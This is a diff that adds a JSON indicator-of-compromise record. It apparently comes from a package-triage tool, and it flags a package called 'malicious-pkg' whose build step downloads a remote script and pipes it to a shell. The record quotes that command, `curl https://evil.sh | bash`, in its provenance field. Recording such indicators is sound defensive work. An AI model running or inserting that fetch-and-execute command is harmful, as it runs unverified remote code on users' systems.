@@ -1,0 +1,17 @@
+{
+  "branch": "triage/ioc-malicious-pkg-199dde6a",
+  "event": "trustsight.confirmed-ioc",
+  "ioc_entries": [
+    {
+      "confidence": "high",
+      "provenance": "the URL fetched and executed by `curl https://evil.sh | bash` in PKGBUILD build()",
+      "type": "domain",
+      "value": "evil.sh"
+    }
+  ],
+  "package": "malicious-pkg",
+  "priority": "default",
+  "rationale": "The build downloads an unverified remote script and pipes it directly to a shell with sha256sums set to SKIP; executing downloaded code without verification is actual malicious behaviour, not merely an unconventional pattern.",
+  "title": "Confirmed IOC: malicious-pkg",
+  "version_transition": "1.0-1 to 1.0-2"
+}
